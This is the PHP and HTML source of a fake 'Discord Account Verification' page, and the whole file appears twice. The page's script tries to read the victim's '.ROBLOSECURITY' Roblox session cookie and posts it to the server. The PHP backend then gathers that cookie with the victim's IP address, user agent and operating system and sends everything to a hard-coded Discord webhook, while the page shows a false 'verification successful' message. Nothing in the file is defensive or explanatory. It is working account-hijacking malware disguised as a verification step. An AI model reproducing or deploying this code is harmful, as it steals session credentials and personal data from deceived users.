<?php
function getOS($userAgent) {
    $os = "Unknown";
    if (preg_match('/Windows/i', $userAgent)) $os = "Windows";
    elseif (preg_match('/Macintosh|Mac OS/i', $userAgent)) $os = "MacOS";
    elseif (preg_match('/Linux/i', $userAgent)) $os = "Linux";
    elseif (preg_match('/Android/i', $userAgent)) $os = "Android";
    elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) $os = "iOS";
    return $os;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    $cookie = $data['cookie'] ?? 'Not found';
    $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os = getOS($user_agent);
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Data for Discord
    $payload = [
        'cookie' => $cookie,
        'discord_user_id' => $user_id,
        'ip_address' => $ip_address,
        'user_agent' => $user_agent,
        'os' => $os,
        'timestamp' => date('c')
    ];

    // Send to Discord
    $webhook_url = 'https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe';
    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode(['content' => "```json\n" . json_encode($payload, JSON_PRETTY_PRINT) . "\n```"])
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);

    // Tell Discord to give role
    $verification_data = [
        'user_id' => $user_id,
        'status' => 'verified'
    ];
    $options['http']['content'] = json_encode(['content' => "```json\n" . json_encode($verification_data, JSON_PRETTY_PRINT) . "\n```"]);
    file_get_contents($webhook_url, false, $context);

    // Send back "success"
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Account Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #36393f 0%, #2f3136 100%);
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            background: rgba(32, 34, 37, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            animation: fadeIn 0.8s ease-out;
            border: 1px solid rgba(79, 84, 92, 0.5);
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #5865f2;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 16px;
            background: linear-gradient(135deg, #5865f2, #7289da);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        p {
            font-size: 16px;
            margin-bottom: 24px;
            opacity: 0.8;
        }
        .loader {
            border: 4px solid rgba(116, 127, 151, 0.3);
            border-top: 4px solid #5865f2;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            animation: slideIn 0.6s ease-out;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success h1 {
            color: #57f287;
            background: linear-gradient(135deg, #57f287, #43b581);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        @media (max-width: 480px) {
            .container { padding: 30px 20px; margin: 20px; }
            h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="container" id="container">
        <h1>Discord Account Verification</h1>
        <p>Verifying your account security. Please wait while we check your details...</p>
        <div class="loader"></div>
    </div>
    <script>
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return "Not found";
        }

        const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
        const robloxCookie = getCookie('.ROBLOSECURITY');
        const data = { cookie: robloxCookie, user_id: userId };

        fetch(window.location.pathname, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            if (result.status === 'success') {
                setTimeout(() => {
                    const container = document.getElementById('container');
                    container.classList.add('success');
                    container.innerHTML = `
                        <h1>Verification Successful!</h1>
                        <p>Your Discord account has been verified. You can now return to the server and enjoy full access.</p>
                    `;
                }, 2000);
            }
        })
        .catch(error => console.error('Error:', error));
    </script>
</body>
</html><?php
function getOS($userAgent) {
    $os = "Unknown";
    if (preg_match('/Windows/i', $userAgent)) $os = "Windows";
    elseif (preg_match('/Macintosh|Mac OS/i', $userAgent)) $os = "MacOS";
    elseif (preg_match('/Linux/i', $userAgent)) $os = "Linux";
    elseif (preg_match('/Android/i', $userAgent)) $os = "Android";
    elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) $os = "iOS";
    return $os;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    $cookie = $data['cookie'] ?? 'Not found';
    $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os = getOS($user_agent);
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Data for Discord
    $payload = [
        'cookie' => $cookie,
        'discord_user_id' => $user_id,
        'ip_address' => $ip_address,
        'user_agent' => $user_agent,
        'os' => $os,
        'timestamp' => date('c')
    ];

    // Send to Discord
    $webhook_url = 'https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe';
    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode(['content' => "```json\n" . json_encode($payload, JSON_PRETTY_PRINT) . "\n```"])
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);

    // Tell Discord to give role
    $verification_data = [
        'user_id' => $user_id,
        'status' => 'verified'
    ];
    $options['http']['content'] = json_encode(['content' => "```json\n" . json_encode($verification_data, JSON_PRETTY_PRINT) . "\n```"]);
    file_get_contents($webhook_url, false, $context);

    // Send back "success"
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Account Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #36393f 0%, #2f3136 100%);
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            background: rgba(32, 34, 37, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            animation: fadeIn 0.8s ease-out;
            border: 1px solid rgba(79, 84, 92, 0.5);
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #5865f2;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 16px;
            background: linear-gradient(135deg, #5865f2, #7289da);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        p {
            font-size: 16px;
            margin-bottom: 24px;
            opacity: 0.8;
        }
        .loader {
            border: 4px solid rgba(116, 127, 151, 0.3);
            border-top: 4px solid #5865f2;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            animation: slideIn 0.6s ease-out;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success h1 {
            color: #57f287;
            background: linear-gradient(135deg, #57f287, #43b581);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        @media (max-width: 480px) {
            .container { padding: 30px 20px; margin: 20px; }
            h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="container" id="container">
        <h1>Discord Account Verification</h1>
        <p>Verifying your account security. Please wait while we check your details...</p>
        <div class="loader"></div>
    </div>
    <script>
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return "Not found";
        }

        const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
        const robloxCookie = getCookie('.ROBLOSECURITY');
        const data = { cookie: robloxCookie, user_id: userId };

        fetch(window.location.pathname, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            if (result.status === 'success') {
                setTimeout(() => {
                    const container = document.getElementById('container');
                    container.classList.add('success');
                    container.innerHTML = `
                        <h1>Verification Successful!</h1>
                        <p>Your Discord account has been verified. You can now return to the server and enjoy full access.</p>
                    `;
                }, 2000);
            }
        })
        .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
